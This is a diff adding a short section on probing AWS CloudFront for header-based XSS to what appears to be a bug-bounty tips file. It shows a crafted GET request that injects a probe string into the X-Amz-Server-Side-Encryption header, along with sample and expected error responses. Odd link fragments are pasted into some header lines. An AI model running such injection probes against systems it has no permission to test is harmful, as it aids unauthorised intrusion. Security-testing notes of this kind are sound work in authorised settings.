@@ -127,10 +127,60 @@ request:
 
 ### Tips & Tricks:
 **Test for XSS on any Request Heder, cookies, Custom Header, X-Forwarded-*  Header**
+
+## Attacking AWS Cloudfront CDN
+**If you see anywhere in response or xml Amazon error bucket stuff 404**
+_Response:_
+```
+HTTP/2 200 Ok
+Date: Thu, 01 Dec 2022 07:51:01 GMT
+X-Cache: Hit from cloudfront
+Via: 1.1 2dd59b0ea355cb92a87e9e385032622a.cloudfront.net (CloudFront)
+X-Amz-Cf-Pop: JFK50-P8
+X-Amz-Cf-Id: KQBmzmGEBmmIfprhoM0VXi7RjmiDnGkXkj-_-uJRAFKhCdNuNYVNBw==
+Age: 1082260 https://link.medium.com/D65XUelUlwb
+```
+Try with header... 
+  ```X-Amz-Server-Side-Encryption: Anything ```
+
+```
+GET /?test HTTP/2
+
+Host: ██████
+
+X-Amz-Server-Side-Encryption: AES256xss
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Upgrade-Insecure-Requests: 1
+
+Te: trailers https://link.medium.com/D65XUelUlwb 
+```
   
-  
-  
-  
+_Response should 400 code_
+```
+HTTP/2 400 Bad Request
+
+Date: Thu, 01 Dec 2022 07:51:01 GMT
+
+Content-Type: application/xml
+
+Cache-Control: public,max-age=600
+
+X-Ua-Compatible: IE=edge,chrome=1
+
+X-Amz-Cf-Pop: JFK50-P8
+
+X-Amz-Cf-Id: oEWROikzmcKM5bviUrsPwyFQTbRzS8S7l_-kzH2NSLbChDsc9_K3yA==
+
+Age: 4 https://link.medium.com/D65XUelUlwb 
+```
   
   
   
